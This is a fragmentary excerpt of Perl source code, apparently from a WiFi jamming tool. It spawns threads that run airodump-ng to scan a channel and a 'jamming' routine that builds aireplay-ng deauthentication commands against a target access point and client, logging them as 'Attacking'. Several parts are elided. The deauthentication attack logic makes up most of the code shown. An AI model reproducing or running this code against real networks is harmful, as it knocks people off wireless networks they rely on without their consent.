...
while ( sleep $cicle ) {
	...
	&message( "Checking states and joining the threads", "Threads", 0 );
	my @joinable_threads=threads->list(threads::joinable);
			&message( scalar(@joinable_threads)." can be joined", "Threads", 0 );
	...
	foreach my $joinable(@joinable_threads){
		...
		&message( $joined." of ".scalar(@joinable_threads)." joined", "Threads", 0 );
...
sub airodump {
	...
	$xterm=$_[3];
	$target=$_[4];
	$SIG{'KILL'} = sub { message("Signal kill received, exiting [WAS airodump-ng thread]","Threads",0);threads->exit(); };
	if($xterm==1){
	system(
"xterm -fn fixed -geom -0-0 -title 'Scanning specified channel' -e 'airodump-ng -c "
		  . $channel
...
sub jamming {
	my($KILL,$target,$dev,$deauth,$direct,$verbose)=@_;
	$SIG{'KILL'} = sub { message("Signal kill received, exiting [WAS attacking on ".$KILL."]","Threads",0);threads->exit(); };
	if($verbose==1){
		if($direct==1){
			message($KILL." with ".$deauth." on ".$dev." direct mode","Attacking",0);
			system( "aireplay-ng --deauth " 
		  . $deauth . " -a " 
		  . $target . " -c " 
		  . $KILL . " "
		...
		if($direct==1){
			...
			message("Finished on ".$KILL." with ".$deauth." on ".$dev,"Attacking",0);
